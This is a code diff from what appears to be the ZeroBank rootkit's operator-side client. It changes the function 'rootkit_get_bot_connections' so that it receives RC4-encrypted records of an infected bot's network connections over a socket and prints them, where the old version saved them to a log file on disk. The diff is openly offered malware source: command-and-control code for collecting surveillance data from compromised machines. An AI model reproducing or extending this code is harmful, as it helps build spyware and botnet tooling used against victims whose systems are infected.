@@ -5,76 +5,44 @@ BOOLEAN rootkit_get_bot_connections(IN SOCKET sock, IN BYTE PacketType)
 	INT sendsize = 0;
 	INT recvsize = 0;
 	ZEROBANK_PACKET_TYPE Packet = { 0 };
-	HANDLE handle;
-	UNICODE_STRING ustr1;
-	OBJECT_ATTRIBUTES oa;
-	NTSTATUS st;
-	IO_STATUS_BLOCK io;
-	WCHAR Buffer[MAX_PATH];
-	DWORD i = 0;
-	BOOL g_cond;
+	PZEROBANK_FILTER_CONNECTION_REQUESTS buffer = NULL;
+	PZEROBANK_FILTER_CONNECTION_REQUESTS entrybuffer = NULL;
+	BOOL g_cond = FALSE;
 	PVOID Out = NULL;
 	PVOID Alloc = NULL;
-	DWORD Size = 0;
-	LARGE_INTEGER large;
+	ULONG getsize = 0;
+	ULONG NumberOfConnections = 0;
+
+
+	char *time = "Time-Stamp";
+	char *infobuffer = "Bot connection sites";
 
 	Packet.PacketType = PacketType;
 
 	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&Packet, sizeof(ZEROBANK_PACKET_TYPE));
 	if (sendsize > 0)
 	{
-		i = GetCurrentDirectoryW(MAX_PATH, Buffer);
-		if (i > 0)
+		recvsize = recv(sock, (PCHAR)&getsize, sizeof(ULONG), 0);
+		if (recvsize > 0 && getsize > 0)
 		{
-			wcscat_s(Buffer, MAX_PATH, TEXT("\\zero-bot-connections.txt"));
-			g_cond = RtlDosPathNameToNtPathName_U(Buffer, &ustr1, NULL, NULL);
-			if (g_cond == TRUE)
+			Out = recv_decrypted(sock, RC4_KEY_2, (PZEROBANK_FILTER_CONNECTION_REQUESTS)buffer, getsize);
+			if (Out)
 			{
-				char *filesize = (char*)LocalAlloc(LPTR, 1024);
-				if (recv(sock, filesize, 1024, 0))
-				{
-					Size = atoi(filesize);
-					printf("\r\n{ DUMP-CONNECTIONS-LOG-PLUGIN } Filesize: %d", Size);
-				}
-				
-				Out = recv_decrypted(sock, RC4_KEY_3, (PVOID)Alloc, Size);
-				if (Out)
-				{
-					large.QuadPart = 1024;				
-					RtlInitUnicodeString(&ustr1, Buffer);
-					InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE, NULL, NULL);
+				NumberOfConnections = getsize / sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS);
 
-					__try
-					{
-	
-						st = NtCreateFile(&handle, FILE_GENERIC_WRITE,
-							&oa, &io,
-							&large,
-							FILE_ATTRIBUTE_NORMAL,
-							FILE_SHARE_WRITE,
-							FILE_CREATE,
-							FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
-							NULL, 0);
-						if (NT_SUCCESS(st))
-						{
-							st = NtWriteFile(handle, NULL, NULL,
-								NULL, &io, Out, Size,
-								NULL, 0);
-							if (NT_SUCCESS(st))
-							{
-								NtClose(handle);
-								g_cond = TRUE;
-							}
-						}
-					}
-					__except (EXCEPTION_EXECUTE_HANDLER)
-					{
-						return GetExceptionCode();
-						printf("\r\nException Caught");
-					}
+				entrybuffer = (PZEROBANK_FILTER_CONNECTION_REQUESTS)Out;
 
+				printf("\r\n");
+				printf("\r\n%15s %30s", time, infobuffer);
+				printf("\r\n");
+
+				for (ULONG i = 0; i < NumberOfConnections; i++, entrybuffer++)
+				{
+					printf("%s", entrybuffer->ShareData);
+					g_cond = TRUE;
 				}
-				RtlFreeHeap(GetProcessHeap(), 0, filesize);
+				RtlFreeHeap(GetProcessHeap(), 0, Out);
+				Out = NULL;
 			}
 		}
 	}
